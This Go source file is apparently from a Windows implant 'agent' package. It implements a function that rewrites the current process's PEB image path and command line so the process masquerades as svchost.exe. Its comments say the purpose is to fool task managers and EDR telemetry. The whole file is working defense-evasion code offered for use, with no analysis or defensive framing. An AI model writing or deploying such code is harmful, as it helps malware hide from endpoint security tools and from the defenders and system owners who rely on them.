//go:build windows

package agent

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// pebSpoof overwrites the ProcessParameters.ImagePathName and CommandLine
// in the current process PEB to impersonate another executable.
// This makes the process appear as a different binary in task managers and EDR telemetry.
func pebSpoof(fakePath string) string {
	if fakePath == "" {
		fakePath = `C:\Windows\System32\svchost.exe`
	}

	// Get PEB address via NtQueryInformationProcess
	type processBasicInfo struct {
		Reserved1       uintptr
		PebBaseAddress  uintptr
		Reserved2       [2]uintptr
		UniqueProcessId uintptr
		Reserved3       uintptr
	}

	var pbi processBasicInfo
	var retlen uint32
	r, _, _ := procNtQueryInformationProcess.Call(
		uintptr(windows.CurrentProcess()), // current process pseudo-handle (-1 on x64)
		0,                   // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&retlen)),
	)
	if r != 0 {
		return fmt.Sprintf("[-] NtQueryInformationProcess: 0x%x", r)
	}

	// PEB.ProcessParameters is at offset 0x20 on x64
	peb := pbi.PebBaseAddress
	ppOffset := uintptr(0x20)
	pp := *(*uintptr)(unsafe.Pointer(peb + ppOffset))
	if pp == 0 {
		return "[-] ProcessParameters is NULL"
	}

	// RTL_USER_PROCESS_PARAMETERS on x64:
	//   ImagePathName at offset 0x60 (UNICODE_STRING)
	//   CommandLine   at offset 0x70 (UNICODE_STRING)
	// UNICODE_STRING layout: Length(2), MaxLength(2), pad(4), Buffer*(8)
	type unicodeString struct {
		Length    uint16
		MaxLength uint16
		_pad      [4]byte
		Buffer    uintptr
	}

	fakeUTF16, err := windows.UTF16PtrFromString(fakePath)
	if err != nil {
		return "[-] UTF16PtrFromString: " + err.Error()
	}
	fakeLen := uint16(len(fakePath) * 2)
	fakeBuf := uintptr(unsafe.Pointer(fakeUTF16))

	// Overwrite ImagePathName
	imgPath := (*unicodeString)(unsafe.Pointer(pp + 0x60))
	var oldProt uint32
	pAddr := uintptr(unsafe.Pointer(imgPath))
	pSize := uintptr(unsafe.Sizeof(*imgPath))
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&pAddr)),
		uintptr(unsafe.Pointer(&pSize)),
		uintptr(windows.PAGE_READWRITE),
		uintptr(unsafe.Pointer(&oldProt)),
	)
	imgPath.Buffer = fakeBuf
	imgPath.Length = fakeLen
	imgPath.MaxLength = fakeLen + 2
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&pAddr)),
		uintptr(unsafe.Pointer(&pSize)),
		uintptr(oldProt),
		uintptr(unsafe.Pointer(&oldProt)),
	)

	// Overwrite CommandLine
	cmdLine := (*unicodeString)(unsafe.Pointer(pp + 0x70))
	cAddr := uintptr(unsafe.Pointer(cmdLine))
	cSize := uintptr(unsafe.Sizeof(*cmdLine))
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&cAddr)),
		uintptr(unsafe.Pointer(&cSize)),
		uintptr(windows.PAGE_READWRITE),
		uintptr(unsafe.Pointer(&oldProt)),
	)
	cmdLine.Buffer = fakeBuf
	cmdLine.Length = fakeLen
	cmdLine.MaxLength = fakeLen + 2
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&cAddr)),
		uintptr(unsafe.Pointer(&cSize)),
		uintptr(oldProt),
		uintptr(unsafe.Pointer(&oldProt)),
	)

	return fmt.Sprintf("[+] PEB spoofed to: %s", fakePath)
}
